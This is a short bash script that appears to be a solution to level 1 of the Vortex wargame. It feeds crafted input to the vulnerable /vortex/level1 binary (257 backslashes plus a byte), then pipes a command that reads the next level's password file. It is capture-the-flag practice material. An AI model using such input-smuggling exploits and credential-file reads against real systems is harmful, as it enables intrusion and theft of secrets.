#!/bin/bash
( perl -e 'print "\\" x 257 . "\xCA!"'; echo \
"cat /etc/vortex_pass/vortex2" ) | /vortex/level1
